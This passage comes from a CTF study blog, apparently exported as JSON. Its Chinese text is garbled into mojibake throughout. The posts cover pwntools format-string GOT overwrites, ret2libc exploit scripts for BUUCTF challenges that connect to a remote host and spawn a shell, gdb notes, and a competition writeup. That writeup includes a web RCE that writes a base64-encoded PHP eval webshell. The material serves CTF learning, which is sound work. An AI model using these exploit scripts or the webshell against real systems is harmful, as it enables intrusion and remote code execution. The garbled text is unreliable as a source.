å®ƒçš„ä½œç”¨æ˜¯ï¼š è‡ªåŠ¨è®¡ç®—å­—ç¬¦æ•°å¹¶æ„é€  payloadï¼Œç”¨äºå†™å…¥ä»»æ„åœ°å€çš„å€¼ï¼ˆå¦‚ GOT è¡¨ã€å˜é‡ã€è¿”å›åœ°å€ç­‰ï¼‰ ğŸ§ª fmtstr_payload çš„ä½¿ç”¨æ–¹æ³• åŸºæœ¬è¯­æ³• 12from pwn import *fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) å‚æ•°è¯´æ˜ offset æ ¼å¼åŒ–å­—ç¬¦ä¸²åç§»é‡ï¼ˆä½ çš„è¾“å…¥åœ¨ç¬¬å‡ ä¸ª%pçš„ä½ç½®ï¼‰ writes ä¸€ä¸ªå­—å…¸ï¼Œè¡¨ç¤ºä½ è¦å†™å…¥çš„åœ°å€å’Œå€¼ï¼Œå¦‚&#123;addr1: value1, addr2: value2&#125; numbwritten å·²ç»è¾“å‡ºçš„å­—ç¬¦æ•°ï¼ˆé»˜è®¤ä¸º 0ï¼Œå¯ä»¥å¿½ç•¥ï¼‰ write_size å†™å…¥å¤§å°ï¼Œå¯é€‰ï¼š&#39;byte&#39;ã€&#39;short&#39;ã€&#39;int&#39;ï¼ˆé»˜è®¤æ˜¯&#39;byte&#39;ï¼‰ ğŸ§© ç¤ºä¾‹ 1ï¼šå†™å…¥ä¸€ä¸ªåœ°å€ä¸º 16 123456789101112from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8 # åç§»é‡addr = elf.symbols[&#x27;a&#x27;] # å‡è®¾ä½ è¦å†™å…¥å˜é‡ a çš„åœ°å€# æ„é€  payloadï¼šå†™å…¥ a = 16payload = fmtstr_payload(offset, &#123;addr: 16&#125;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() ğŸ§© ç¤ºä¾‹ 2ï¼šå†™å…¥å¤šä¸ªåœ°å€ï¼ˆå¦‚ a=16, b=2, c=0x12345678ï¼‰ 12345678910111213141516171819from pwn import *elf = ELF(&quot;./vuln&quot;)offset = 8a_addr = elf.symbols[&#x27;a&#x27;]b_addr = elf.symbols[&#x27;b&#x27;]c_addr = elf.symbols[&#x27;c&#x27;]# æ„é€  payloadï¼šå†™å…¥å¤šä¸ªåœ°å€writes = &#123; a_addr: 16, b_addr: 2, c_addr: 0x12345678&#125;payload = fmtstr_payload(offset, writes, write_size=&#x27;int&#x27;)p = process(&quot;./vuln&quot;)p.sendline(payload)p.interactive() fmt_demoï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²çš„ç»¼åˆåˆ©ç”¨ï¼‰ å¯ä»¥å…ˆæ³„éœ²libcçš„åŸºå€ï¼Œå¾—åˆ°systemå‡½æ•°çš„åœ°å€ å†æ ¹æ®æ­¤æŠŠprintfçš„gotè¡¨å­˜å‚¨çš„åœ°å€æ¢ä¸ºsystemå‡½æ•°çš„åœ°å€ ä¹‹åè¾“å…¥å‚æ•°â€œ&#x2F;bin&#x2F;shâ€,å°±å¯ä»¥å®ç° è„šæœ¬12345678910111213141516171819202122from pwn import *from LibcSearcher import LibcSearcherp=process(&quot;./fmt_demo&quot;)elf=ELF(&quot;./fmt_demo&quot;)read_got=elf.got[&quot;read&quot;]payload=p32(read_got)+b&quot;%4$s&quot;p.send(payload.ljust(0x100,b&quot;\\x00&quot;))read=u32(p.recv(8)[4:])print(hex(read))libc=LibcSearcher(&quot;read&quot;,read)libc_base=read-libc.dump(&quot;read&quot;)system=libc_base+libc.dump(&quot;system&quot;)payload=fmtstr_payload(offset=4,writes=&#123;elf.got[&quot;printf&quot;]:system&#125;)p.sendline(payload.ljust(0x100,b&quot;\\x00&quot;))bin=b&quot;/bin/sh&quot;p.sendline(bin.ljust(0x100,b&quot;\\x00&quot;))p.interactive() é‚£ä¸ºä»€ä¹ˆè¿˜è¦å¡«è¡¥ payload çš„é•¿åº¦ä¸º 0x100 å­—èŠ‚ï¼Ÿâ€ æˆ‘ä»¬æ¥ä» â€œpayload è¢«å¤åˆ¶åˆ°æ ˆä¸Šâ€ è¿™ä¸ªç°è±¡å‡ºå‘ï¼Œè§£é‡Šä¸ºä»€ä¹ˆæˆ‘ä»¬æœ‰æ„åœ° å°† payload å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œå°½ç®¡å®ƒå¯èƒ½ä¼šè¢«å¤åˆ¶åˆ°æ ˆä¸Šã€‚ âœ… ç®€çŸ­å›ç­”ï¼š æˆ‘ä»¬å¡«è¡¥ payload åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100 å­—èŠ‚ï¼‰ï¼Œæ˜¯ä¸ºäº†è®© payload è¢«å®Œæ•´å¤åˆ¶åˆ°æ ˆä¸Šï¼Œä»è€Œè®©åç§»å›ºå®šã€å¸ƒå±€å¯æ§ï¼Œä¾¿äºåˆ©ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´è¿›è¡Œåœ°å€æ³„éœ²æˆ–å†™å…¥æ“ä½œã€‚ ğŸ“Œ payload çš„ä¸¤ç§â€œå‘½è¿â€ï¼š 1ï¸âƒ£ payload çŸ­ &lt; ä¸€äº›å‚æ•°é•¿åº¦ printfä»æ ˆä¸Šè¯»å–å‚æ•° payload åœ¨ buf ä¸­ï¼Œå‚æ•°åœ¨æ ˆä¸Š 2ï¸âƒ£ payload é•¿ &gt; ä¸€å®šé•¿åº¦ï¼ˆå¦‚ 100 å­—èŠ‚ï¼‰ printfæŠŠ payload å¤åˆ¶åˆ°æ ˆä¸Š payload æœ¬èº«å°±åœ¨æ ˆä¸Š ğŸ§© ä¸ºä»€ä¹ˆè¦â€œæ•…æ„â€è®© payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Ÿ âœ… ä¼˜ç‚¹ä¸€ï¼šåç§»å›ºå®šï¼Œä¾¿äºè°ƒè¯• payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šåï¼Œå®ƒåœ¨æ ˆä¸Šçš„ä½ç½®æ˜¯å›ºå®šçš„ã€‚ æˆ‘ä»¬å¯ä»¥ç²¾å‡†æ§åˆ¶åç§»ï¼ˆæ¯”å¦‚ %4$s å°±ä¸€å®šè¯»å– payload ä¸­çš„åœ°å€ï¼‰ã€‚ é¿å…äº†å›  payload é•¿åº¦ä¸åŒå¯¼è‡´åç§»å˜åŒ–çš„é—®é¢˜ã€‚ âœ… ä¼˜ç‚¹äºŒï¼šä¾¿äºæ„é€ å†™å…¥æ“ä½œï¼ˆå¦‚ %nï¼‰ å½“æˆ‘ä»¬æƒ³ç”¨ %n å†™æŸä¸ªåœ°å€æ—¶ï¼Œéœ€è¦ç¡®ä¿åœ°å€åœ¨æ ˆä¸Šï¼Œä¸”åç§»å›ºå®šã€‚ å¦‚æœ payload è¢«å¤åˆ¶åˆ°æ ˆä¸Šï¼Œæˆ‘ä»¬å°±å¯ä»¥æŠŠåœ°å€æ”¾åœ¨ payload å¼€å¤´ï¼Œç„¶åç”¨ %1$n ç²¾å‡†å†™å…¥ã€‚ âœ… ä¼˜ç‚¹ä¸‰ï¼šé˜²æ­¢ payload è¢«æˆªæ–­æˆ–åç§»æ¼‚ç§» å¦‚æœ payload é•¿åº¦ä¸å›ºå®šï¼Œå¯èƒ½å¯¼è‡´åç§»å˜åŒ–ï¼Œ%sã€%n è¯»å†™é”™è¯¯åœ°å€ã€‚ å¡«å……åˆ°å›ºå®šé•¿åº¦ï¼ˆå¦‚ 0x100ï¼‰å¯ä»¥é¿å…è¿™ç§æ¼‚ç§»ã€‚ :grey_question:ä½†æˆ‘å…¶å®ä¸å¤ªç†è§£","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","slug":"æ ¼å¼åŒ–å­—ç¬¦ä¸²","permalink":"http://example.com/tags/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"}]},{"title":"ret2libc-printf","slug":"ret2libc-printf","date":"2025-07-20T06:53:58.000Z","updated":"2025-09-03T10:56:53.695Z","comments":true,"path":"2025/07/20/ret2libc-printf/","permalink":"http://example.com/2025/07/20/ret2libc-printf/","excerpt":"","text":"ä¸¥æ ¼ç¬¦åˆprintfçš„æ ¼å¼[HarekazeCTF2019]baby_rop2 è€Œä¸”å‡½æ•°ä¸­æ²¡æœ‰systemå‡½æ•°å’Œç›¸åº”å­—ç¬¦ä¸² è¦æ³„éœ²libcçš„åœ°å€ é€šè¿‡readè¯»å–æ•°æ®ï¼Œç”¨printfæ‰“å°å‡ºæ¥ printf å‡½æ•°çš„ GOT åœ°å€ä¸èƒ½ç”¨æ¥æ³„éœ² printf è‡ªå·±çš„åœ°å€ï¼Ÿ æ˜¯çš„ï¼Œè¿™æ˜¯ä¸ªé¸¡ç”Ÿè›‹è›‹ç”Ÿé¸¡ çš„é—®é¢˜ï¼š printf@got ä¿å­˜çš„æ˜¯ printf çš„çœŸå®åœ°å€ï¼ˆlibc ä¸­çš„åœ°å€ï¼‰ã€‚ ä½†ä½ è¦è°ƒç”¨ printf æ‰èƒ½æ‰“å°å®ƒï¼Œè€Œè°ƒç”¨ printf åˆä¾èµ– GOT è¡¨é¡¹çš„åœ°å€ã€‚ å¦‚æœ GOT è¡¨é¡¹è¿˜æ²¡è§£æï¼ˆå»¶è¿Ÿç»‘å®šï¼‰ï¼Œå®ƒæŒ‡å‘ PLT stubï¼Œä¸æ˜¯çœŸå®åœ°å€ã€‚ å³ä½¿ GOT è¡¨é¡¹å·²è§£æï¼Œä½ ä¹Ÿæ— æ³•é€šè¿‡ printf(&quot;%s&quot;, printf_got) æ­£ç¡®è¯»å–åœ°å€ã€‚ ğŸ§  æ€»ç»“å¯¹æ¯” puts(puts_got) âœ… å¯è¡Œ putsä¼šå°è¯•æ‰“å°ä»puts_gotå¼€å§‹çš„å†…å®¹ï¼Œlibc ä¸­æœ‰å­—ç¬¦ä¸²ï¼Œä¸ä¼šå´©æºƒ printf(&quot;%s&quot;, printf_got) âŒ ä¸å¯è¡Œ printfä¼šå°è¯•ä»printf_gotåœ°å€è¯»å–å­—ç¬¦ä¸²ï¼Œä½†é‚£æ˜¯ä¸ªå‡½æ•°åœ°å€ï¼Œä¸æ˜¯å­—ç¬¦ä¸² printf(&quot;%p&quot;, printf_got) âœ… å¯è¡Œï¼ˆéœ€æ„é€ ï¼‰ å¯ä»¥æ‰“å°åœ°å€ï¼Œä½†éœ€è¦æ­£ç¡®è®¾ç½®æ ¼å¼å­—ç¬¦ä¸² printf(&quot;%s&quot;, read_got) âœ… å¯è¡Œï¼ˆå¶å°”ï¼‰ read_gotæŒ‡å‘çš„åœ°å€é™„è¿‘å¯èƒ½æœ‰å­—ç¬¦ä¸²ï¼Œå¯ä»¥æ‰“å°å‡ºæ¥ puts(printf_got) âœ… å¯è¡Œï¼ˆå¶å°”ï¼‰ åŒä¸Šï¼Œä½†ä¾èµ– libc ä¸­çš„å­—ç¬¦ä¸² è¦è°ƒç”¨printfå‡½æ•°è¿›è¡Œæ³„éœ²ï¼Œå°±è¦æ ¹æ®å…¶ç‰¹æ€§æ¥ä¼ å‚ï¼Œprintfå‡½æ•°æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼Œä¸€ä¸ªå¯å˜å‚æ•°åˆ—è¡¨ RDIã€RSIã€RDXã€RCXã€R8ã€R9å‚æ•°æŒ‰ç…§è¿™ä¸ªé¡ºåºä¼ å…¥å¯„å­˜å™¨ä¸­ æœ‰å•ç‹¬çš„rdi æ‰€ä»¥rdi&#x3D;0x400733 ä½†æ²¡æœ‰å•ç‹¬å¯¹rsiçš„å¤„ç† æ‰€ä»¥rsi_r15&#x3D;0x400731ï¼Œå¯¹r15éšä¾¿ä¼ å…¥ä¸€ä¸ªæ•°å°±å¯ ç¬¬ä¸€æ¬¡payloadçš„æ„é€  12345678910payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read)) ç¬¬äºŒæ¬¡é€šè¿‡è®¡ç®—å‡ºlibcçš„åŸºå€ï¼ŒåŠ ä¸Šåç§»é‡å°±å¾—åˆ°äº†éœ€è¦çš„å‡½æ•°çš„åœ°å€ï¼Œå°±å¯ä¸iè¿›è¡Œæ„é€ äº† 1payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr) è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536from pwn import *from LibcSearcher import *context.log_level = &#x27;debug&#x27;#p = process(&#x27;./babyrop2&#x27;)p = remote(&quot;node5.buuoj.cn&quot;,25235)elf = ELF(&#x27;./babyrop2&#x27;)pop_rdi = 0x0000000000400733pop_rsi_r15 = 0x0000000000400731 format_str = 0x0000000000400770 ret_addr = 0x0000000000400734printf_plt = elf.plt[&#x27;printf&#x27;]read_got = elf.got[&#x27;read&#x27;]main_plt = 0x400636payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(format_str)payload+=p64(pop_rsi_r15)+p64(read_got)+p64(0)payload+=p64(printf_plt)+p64(main_plt)p.recvuntil(b&quot;name? &quot;)p.sendline(payload)read= u64(p.recvuntil(b&quot;\\x7f&quot;)[-6:] + b&#x27;\\0\\0&#x27;)print(hex(read))libc = LibcSearcher(&#x27;read&#x27;, read)libc_base = read - libc.dump(&#x27;read&#x27;)sys_addr = libc_base + libc.dump(&#x27;system&#x27;)bin_sh = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)payload = b&#x27;a&#x27;*0x28+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)p.sendline(payload)p.interactive() å•ä¸ªå‡½æ•°pwn2_sctf_2016 é¦–å…ˆçœ‹åˆ°é¢˜ç›®è¾“å…¥ä¸€ä¸ªå°äº32çš„æ•°ï¼Œå¹¶æŠŠè¿™ä¸ªæ•°å½“ä½œgetè¾“å…¥çš„æœ€å¤§é™åˆ¶ æ‰€ä»¥å¯ä»¥è¾“å…¥ä¸€ä¸ªè´Ÿæ•°æ¥è§£å†³è¿™ä¸ªé™åˆ¶ ä¹Ÿæ˜¯æ²¡æœ‰systemå‡½æ•°çš„ç›¸å…³å†…å®¹ è€ƒè™‘æ³„éœ²libcçš„åœ°å€ :detective:ç”¨printfæ‰“å°ï¼Œå¯ä»¥ç”¨printfçš„gotè¡¨ã€ å› ä¸ºä½ è°ƒç”¨äº† printf(printf_got)ã€‚ å¯¹äº printf æ¥è¯´ï¼š å®ƒçœ‹ä¸åˆ°è¿™æ˜¯ä¸€ä¸ªæ•´æ•°åœ°å€ å®ƒåªæ˜¯æŠŠä½ ç»™çš„æŒ‡é’ˆå½“ä½œä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼è§£æ å¦‚æœä½ ä¼ å…¥çš„è¿™ä¸ªåœ°å€æ˜¯å¯è¯»çš„å†…å­˜ï¼Œå®ƒå°±ä¼šæŒ‰ç…§é‚£å—å†…å­˜çš„å†…å®¹å½“ä½œå­—ç¬¦ä¸²å»è¾“å‡º æ‰€ä»¥å¦‚æœåªæ˜¯ä¼ ä¸€ä¸ªå‚æ•°ï¼Œprintfå‡½æ•°ä¼šåˆšå¥½æŠŠå®ƒå½“ä½œå­—ç¬¦ä¸² åˆšå¥½è§£å†³äº†ä¼ é€’å®ƒæœ¬èº«çš„gotè¡¨åœ°å€ï¼Œå’Œåªæœ‰ä¸€ä¸ªå‚æ•°çš„é—®é¢˜ 1payload=b&#x27;a&#x27; * (0x2c+4) + p32(printf_plt) + p32(main) + p32(printf_got) ä¹‹åå°±æ˜¯æ ‡å‡†æµç¨‹ å°±æ˜¯è®°å¾—è¿”å›åœ°å€æ˜¯mainå‡½æ•° è¦å†æ¬¡è¾“å…¥ä¾æ¬¡é‚£ä¸ªè´Ÿæ•° è„šæœ¬ 123456789101112131415161718192021222324252627282930from pwn import *from LibcSearcher import *from time import sleepr = remote(&quot;node5.buuoj.cn&quot;,28640)elf = ELF(&#x27;./pwn2_sctf_2016&#x27;)printf_plt = elf.plt[&#x27;printf&#x27;]printf_got = elf.got[&#x27;printf&#x27;]main= elf.sym[&#x27;main&#x27;]r.recvuntil(b&#x27;read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4)payload += p32(printf_plt) + p32(main) + p32(printf_got)r.sendline(payload)r.recvuntil(&#x27;\\n&#x27;)printf_addr=u32(r.recv(4))#æ¥å—libc = LibcSearcher(&#x27;printf&#x27;,printf_addr)base = printf_addr - libc.dump(&#x27;printf&#x27;)system_addr = base + libc.dump(&#x27;system&#x27;)bin_sh = base + libc.dump(&#x27;str_bin_sh&#x27;)r.recvuntil(b&#x27;How many bytes do you want me to read?&#x27;)r.sendline(b&#x27;-1&#x27;)r.recvuntil(b&quot;data!\\n&quot;)payload = b&#x27;a&#x27; * (0x2c+4) + p32(system_addr) + p32(main) + p32(bin_sh)r.sendline(payload)r.interactive()","categories":[{"name":"exercise_pwn","slug":"exercise-pwn","permalink":"http://example.com/categories/exercise-pwn/"}],"tags":[{"name":"ret2libc-printf","slug":"ret2libc-printf","permalink":"http://example.com/tags/ret2libc-printf/"},{"name":"stack","slug":"stack","permalink":"http://example.com/tags/stack/"}]},{"title":"gdbè°ƒè¯•","slug":"æ§åˆ¶å‘½ä»¤","date":"2025-07-16T03:04:42.000Z","updated":"2025-08-30T11:58:21.219Z","comments":true,"path":"2025/07/16/æ§åˆ¶å‘½ä»¤/","permalink":"http://example.com/2025/07/16/%E6%8E%A7%E5%88%B6%E5%91%BD%E4%BB%A4/","excerpt":"","text":"TABï¼šæ˜¾ç¤ºæ‰€æœ‰å‘½ä»¤ start:è¿è¡Œåˆ°ç¨‹åºå…¥å£å¤„ run:è¿è¡Œå®Œæ•´ä¸ªç¨‹åº ğŸ” x å‘½ä»¤çš„åŸºæœ¬è¯­æ³•ï¼šx&#x2F;nfs address n ï¼šè¦æ˜¾ç¤ºçš„å†…å­˜å•å…ƒä¸ªæ•°ï¼ˆé»˜è®¤æ˜¯ 1ï¼‰ã€‚ f ï¼šæ˜¾ç¤ºæ ¼å¼ï¼ˆformatï¼‰ï¼Œæ¯”å¦‚åå…­è¿›åˆ¶ã€åè¿›åˆ¶ã€å­—ç¬¦ä¸²ç­‰ã€‚ s ï¼šå†…å­˜å•å…ƒå¤§å°ï¼ˆsizeï¼‰ï¼Œæ¯”å¦‚å­—èŠ‚ã€åŠå­—ã€å­—ç­‰ã€‚ address ï¼šè¦æŸ¥çœ‹çš„å†…å­˜åœ°å€ï¼ˆå¯ä»¥æ˜¯å˜é‡åã€å¯„å­˜å™¨ã€æŒ‡é’ˆè¡¨è¾¾å¼ç­‰ï¼‰ã€‚ fï¼šè¾“å‡ºæ ¼å¼ï¼ˆformatï¼‰ x Hexï¼ˆåå…­è¿›åˆ¶ï¼‰ d Decimalï¼ˆåè¿›åˆ¶ï¼‰ u Unsigned decimal o Octalï¼ˆå…«è¿›åˆ¶ï¼‰ t Binaryï¼ˆäºŒè¿›åˆ¶ï¼‰ f Floating pointï¼ˆæµ®ç‚¹æ•°ï¼‰ a Addressï¼ˆåœ°å€ï¼Œæ˜¾ç¤ºæŒ‡é’ˆï¼‰ i Instructionï¼ˆåæ±‡ç¼–æŒ‡ä»¤ï¼‰ c Charï¼ˆå­—ç¬¦ï¼‰ s Stringï¼ˆå­—ç¬¦ä¸²ï¼‰ sï¼šå†…å­˜å•å…ƒå¤§å°ï¼ˆsizeï¼‰ b byteï¼ˆå­—èŠ‚ï¼‰ 1 å­—èŠ‚ h halfwordï¼ˆåŠå­—ï¼‰ 2 å­—èŠ‚ w wordï¼ˆå­—ï¼‰ 4 å­—èŠ‚ g giant wordï¼ˆåŒå­—ï¼‰ 8 å­—èŠ‚ ğŸ§  ç¤ºä¾‹ç”¨æ³• 1.æŸ¥çœ‹åœ°å€ 0x7fffffffe000 å¤„çš„ 4 ä¸ª 4 å­—èŠ‚æ•°å€¼ï¼Œä»¥åå…­è¿›åˆ¶æ˜¾ç¤ºï¼š 1x/4wx 0x7fffffffe000 è¾“å‡º 10x7fffffffe000: 0x00000001 0x00007fff 0x00000000 0x00000000 2. æŸ¥çœ‹åœ°å€ 0x400500 å¤„çš„ 5 æ¡æ±‡ç¼–æŒ‡ä»¤ï¼š 1x/5i 0x400500 è¾“å‡º 123450x400500: push %rbp0x400501: mov %rsp,%rbp0x400504: sub $0x10,%rsp0x400508: mov %edi,-0x4(%rbp)0x40050b: mov %rsi,-0x10(%rbp) 3. æŸ¥çœ‹æ ˆé¡¶æŒ‡é’ˆ rsp åœ°å€çš„å†…å®¹ï¼ˆä»¥ 8 å­—èŠ‚ä¸ºå•ä½ï¼Œæ˜¾ç¤ºä¸ºåå…­è¿›åˆ¶ï¼‰ï¼š 1x/gx $rsp è¾“å‡º 1x/gx $rsp 4. æŸ¥çœ‹åœ°å€ 0x7fffffffe010 å¼€å§‹çš„å­—ç¬¦ä¸²ï¼š 1x/s 0x7fffffffe010 è¾“å‡º 10x7fffffffe010: &quot;Hello, world!&quot; 5.æŸ¥çœ‹åœ°å€ 0x601038 çš„ 10 ä¸ªå­—èŠ‚ï¼Œä»¥åè¿›åˆ¶å½¢å¼æ˜¾ç¤ºï¼š 1x/10db 0x601038 è¾“å‡º 10x601038: 72 101 108 108 111 44 32 119 111 114 :small_airplane:æ¥æ”¶æ•°æ® å‡½æ•° è¯´æ˜ recvall() æ¥æ”¶æ‰€æœ‰æ•°æ®ç›´åˆ° EOF recvline() æ¥æ”¶ä¸€è¡Œï¼ˆä»¥\\nç»“å°¾ï¼‰ recvuntil(delim) æ¥æ”¶æ•°æ®ç›´åˆ°é‡åˆ°æŒ‡å®šåˆ†éš”ç¬¦ï¼ˆå¦‚&quot;Welcome!&quot;ï¼‰ recvregex(regex) æ¥æ”¶æ•°æ®ç›´åˆ°åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼ recv(n) æ¥æ”¶æŒ‡å®šå­—èŠ‚æ•°çš„æ•°æ®ï¼ˆé˜»å¡ç›´åˆ°æ”¶åˆ° n å­—èŠ‚ï¼‰","categories":[{"name":"pwn_study","slug":"pwn-study","permalink":"http://example.com/categories/pwn-study/"}],"tags":[{"name":"PWN","slug":"PWN","permalink":"http://example.com/tags/PWN/"},{"name":"gdb","slug":"gdb","permalink":"http://example.com/tags/gdb/"}]},{"title":"å¾¡ç½‘æ¯çº¿ä¸‹2025","slug":"å¾¡ç½‘æ¯2025çº¿ä¸‹","date":"2025-07-14T13:48:44.000Z","updated":"2025-08-26T09:07:19.831Z","comments":true,"path":"2025/07/14/å¾¡ç½‘æ¯2025çº¿ä¸‹/","permalink":"http://example.com/2025/07/14/%E5%BE%A1%E7%BD%91%E6%9D%AF2025%E7%BA%BF%E4%B8%8B/","excerpt":"","text":"re_c FLAG:flag{HNCTFmng1} re_python å¾—åˆ° è„šæœ¬ 12345678910c = [144, 163, 158, 177, 121, 39, 58, 58, 91, 111, 25, 158, 72, 53, 152, 78, 171, 12, 53, 105, 45, 12, 12, 53, 12, 171, 111, 91, 53, 152, 105, 45, 152, 144, 39, 171, 45, 91, 78, 45, 158, 8]flag=&quot;&quot;for i in range(42): for j in range (128): if j * 33 % 179 == c[i]: flag+=chr(j)print(flag)#flag&#123;2889e7a3-0d6b-4cbb-b6e9-04c0f26c9dca&#125; å†æ›¿æ¢ä¸€ä¸‹ crypto1 æ”¾åˆ°éšæ³¢é€æµé‡Œé¢èƒ½çœ‹åˆ°Rot13è§£ç ä¹‹åæ˜¯æ˜æ˜¾çš„16è¿›åˆ¶ç¼–ç å½¢å¼ ç»è¿‡16è¿›åˆ¶è½¬å­—ç¬¦åç‰¹å¾å¾ˆæ˜æ˜¾ï¼Œæœ€åBase32-&gt;Base64-&gt;Ascii85æ··åˆè§£ç å¾—åˆ°flagã€‚ Crypto_10çœ‹åˆ°é¢˜ç›®æè¿°é‡æ’æ—¶åº 62æ˜ŸåºçŒœæµ‹å€’åºå’ŒBase62ã€‚ å€’åºï¼š Base62è§£ç ï¼š cryptoè§£å‹è¿™ä¸ªæ–‡ä»¶å¤¹æ‰“å¼€ä¸‹è½½çš„é™„ä»¶ï¼Œæœ‰ä¸€ä¸ªå‹ç¼©åŒ…å’Œä¸€å¼ å›¾ç‰‡ã€‚ç›´æ¥è§£å‹æ–‡ä»¶å¤¹éœ€è¦å¯†ç ï¼Œå›¾ç‰‡ä¹Ÿä¸èƒ½ç›´æ¥æ‰“å¼€ã€‚ å›¾ç‰‡ç”¨010æ‰“å¼€å‘ç°æ–‡ä»¶å¤´æ˜¯é”™çš„ä¿®æ”¹ä¸€ä¸‹ï¼Œå¾—åˆ°è§£å‹å¯†ç ã€‚ å‹ç¼©åŒ…è§£å‹å¾—åˆ°flag.jpgç›´æ¥æ”¾éšæ³¢é€æµé‡Œç„¶åbase64è§£ç ã€‚ å¾—åˆ°ctf_you_passedåŒ…è£¹flag{}å°±æ˜¯æœ€åçš„flagã€‚ crypto encryption21234567891011121314151617181920212223242526272829303132333435from secret import init1,init2,init3,FLAGimport hashlibassert(FLAG==&quot;flag&#123;&quot;+hashlib.sha256(init1+init2+init3).hexdigest()+&quot;&#125;&quot;)classlfsr(): def__init__(self, init, mask, length): self.init = init self.mask = mask self.lengthmask = 2**(length+1)-1 defnext(self): nextdata = (self.init &lt;&lt; 1) &amp; self.lengthmask i = self.init &amp; self.mask &amp; self.lengthmask output = 0 while i != 0: output ^= (i &amp; 1) i = i &gt;&gt; 1 nextdata ^= output self.init = nextdata return outputdefcombine(x1,x2,x3): return (x1*x2)^(x2*x3)^(x1*x3)if __name__==&quot;__main__&quot;: l1 = lfsr(int.from_bytes(init1,&quot;big&quot;),0b100000000000000000000000010000000000000000000000,48) l2 = lfsr(int.from_bytes(init2,&quot;big&quot;),0b100000000000000000000000000000000010000000000000,48) l3 = lfsr(int.from_bytes(init3,&quot;big&quot;),0b100000100000000000000000000000000000000000000000,48) withopen(&quot;keystream&quot;,&quot;wb&quot;) as f: for i inrange(8192): b = 0 for j inrange(8): b = (b&lt;&lt;1)+combine(l1.next(),l2.next(),l3.next()) f.write(chr(b).encode()) Misc1é¢˜ç›®é™„ä»¶æ˜¯ä¸€ä¸ªåŠ å¯†çš„å‹ç¼©åŒ…ï¼Œç›´æ¥çˆ†ç ´ã€‚ æ‰“å¼€æ–‡æ¡£å…¨é€‰å¤åˆ¶ ç²˜è´´ä¸€ä¸‹å°±èƒ½çœ‹åˆ°flag Misc2 é”®ç›˜æµé‡ Misc3 æ•°æ®åŒ…åˆ†æé™„ä»¶é‡Œçš„.exeæ˜¯å‹ç¼©åŒ…ï¼Œä¿®æ”¹åç¼€è§£å‹ã€‚ æ‰¾åˆ°æµé‡åŒ…å…¨å±€æœç´¢flagä»¥åŠflagå…¶ä»–ç¼–ç å½¢å¼ã€‚ 16è¿›åˆ¶è§£ç  Misc4å·¥ä¸šæµé‡åˆ†æ æŒ‰ç…§æ—¶é—´æ’åºï¼Œæœ€å…ˆSTOPçš„åŒ…ã€‚ 1flag&#123;ac6417423bb3000c&#125; web rceæ–¹æ³•ä¸€ï¼ˆæ‰“å°ç¼–ç çš„flagï¼‰1ip/?cmd=print(base64_encode(file_get_contents(base64_decode(&quot;ZmxhZy5waHA=&quot;)))); æ–¹æ³•äºŒï¼ˆå†™å…¥webshellï¼‰ç›´æ¥å†™å…¥ä¸€ä¸ªwebshell 1234file_put_contents( base64_decode(&quot;c2hlbGwucGhw&quot;), // &quot;shell.php&quot; base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hdKTs/Pg==&quot;) // &quot;&lt;?php @eval(\\$_POST[x]); ?&gt;&quot;); è¿›è¡Œç¼–ç åä¸ºï¼š 1ip/?cmd=file_put_contents(base64_decode(&quot;c2hlbGwucGhw&quot;),base64_decode(&quot;PD9waHAgQGV2YWwoJF9QT1NUW3hd web äºŒæ¬¡ç¼–ç ç›´æ¥è®¿é—®/flag.phpå°±å¯ä»¥å¾—åˆ°flag.php web sqlç›´æ¥ç”¨sqlmapã€‚","categories":[{"name":"WP","slug":"WP","permalink":"http://example.com/categories/WP/"}],"tags":[{"name":"WP","slug":"WP","permalink":"http://example.com/tags/WP/"}]},{"title":"[HNCTF 2022 WEEK4]flower plus","slug":"HNCTF-2022-WEEK4-flower-plus","date":"2025-07-14T00:49:30.000Z","updated":"2025-08-30T11:56:15.374Z","comments":true,"path":"2025/07/14/HNCTF-2022-WEEK4-flower-plus/","permalink":"http://example.com/2025/07/14/HNCTF-2022-WEEK4-flower-plus/","excerpt":"","text":"é“¾æ¥ èŠ±æŒ‡ä»¤åˆ†æ å‘ç°èŠ±æŒ‡ä»¤ db 0C7h çš„â€œåƒåœ¾â€ä½œç”¨ï¼š 0x4012A6 å¤„çš„ db 0C7h æ˜¯ä¸€ä¸ªæ•°æ®å­—èŠ‚ã€‚å®ƒè¢« jnz 